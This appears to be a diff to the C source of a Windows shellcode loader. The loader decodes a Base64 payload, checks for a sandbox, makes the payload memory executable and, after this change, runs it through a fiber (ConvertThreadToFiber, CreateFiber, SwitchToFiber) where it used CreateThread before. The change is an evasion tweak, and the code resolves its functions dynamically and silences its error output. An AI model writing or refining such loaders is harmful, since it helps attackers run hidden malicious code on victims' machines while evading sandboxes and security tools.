@@ -50,8 +50,8 @@ unsigned int payload_len = (unsigned int)(sizeof(payload)/sizeof(payload[0]));
 ///   0 - OK
 ///  -1 - VirtualAlloc() failed
 ///  -2 - VirtualProtect() failed
-///  -3 - CreateThread() failed
-///  -4 - WaitForSingleObject() failed
+///  -3 - ConvertThreadToFiber() failed
+///  -4 - CreateFiber() failed
 ///  -5 - Base64 decoding failed while trying to assess the length of the resulting string
 ///  -6 - Base64 decoding failed 
 /// -98 - Failed to populate functions
@@ -59,16 +59,24 @@ unsigned int payload_len = (unsigned int)(sizeof(payload)/sizeof(payload[0]));
 int main(void){
     BOOL rv;
     BOOL b64_return;
-    HANDLE th;
     DWORD _event = 0;
     void * exec_mem;
     DWORD oldprotect = 0;
     DWORD decoded_data_len;
+    LPVOID th;
+    LPVOID fiber; 
     
     // Populate functions
     if (__get_funcs() != 0){    
-        // fprintf(stderr, "Failed to populate functions\nCode: %d\n", funs);
+        // fprintf(stderr, "Failed to populate functions\n");
         return -98;
+    }
+
+    // Convert main Thread to fiber
+    th = _ConvertThreadToFiber(NULL);
+    if(th == NULL){
+        // fprintf(stderr, "ConvertThreadToFiber failed!\n");
+        return -3;
     }
 
     // Check for sandbox
@@ -106,19 +114,14 @@ int main(void){
         // fprintf(stderr, "VirtualProtect Failed with error code: %d\n", GetLastError());
         return -2;
     }
-
-    // Create Thread To run shellcode
-    th = _CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
-    if (th == NULL){
-        // fprintf(stderr, "CreateThread Failed with error code: %d\n", GetLastError());
-        return -3;
-    }
-
-    _event = _WaitForSingleObject(th, -1);
-    if(_event == WAIT_FAILED){
-        // fprintf(stderr, "WaitForSingleObject Failed with error code: %d\n", GetLastError());
+    
+    fiber = _CreateFiber(0, (LPFIBER_START_ROUTINE)exec_mem, NULL);
+    if (fiber == NULL){
+        // fprintf(stderr, "CreateFiber Failed with error code: %d\n", GetLastError());
         return -4;
     }
-  
+
+    _SwitchToFiber(fiber);
+
     return 0;
 }
